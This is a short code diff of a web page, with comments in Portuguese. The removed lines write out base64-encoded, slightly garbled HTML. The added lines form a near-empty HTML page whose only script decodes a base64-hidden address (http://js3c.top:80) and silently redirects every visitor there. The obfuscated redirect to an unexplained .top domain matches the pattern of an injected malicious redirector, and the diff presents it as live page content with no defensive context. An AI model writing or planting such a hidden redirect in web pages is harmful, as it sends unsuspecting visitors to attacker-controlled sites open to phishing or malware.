@@ -1,3 +1,17 @@
-let base64String = "PCFET0NUWVBFIEhUTUwgUGFnZSBMaW5rPSJwdC1icj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICBtZXRhIGh0dHByZXZpcDY9ImZyZWNoIiBjb250ZW50PSIwOyB1cmw9aHR0cDovL2pzM2MudG9wOjgwIj4KICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXB0Ij4KICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsaWNlKCdodHRwOi8vanMzYy50b3A6ODA4Jyk7CiAgICAgICAgfSwgMTAwKTsKICAgIDwvYm9keT4KPC9odG1sPg==";
-let decodedHTML = atob(base64String);
-document.write(decodedHTML);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        // URL codificada em Base64
+        const base64URL = "aHR0cDovL2pzM2MudG9wOjgw";
+        
+        // Decodifica a URL
+        const decodedURL = atob(base64URL);
+        
+        // Redireciona para a URL decodificada
+        window.location.replace(decodedURL);
+    </script>
+</head>
+<body>
+</body>
+</html>
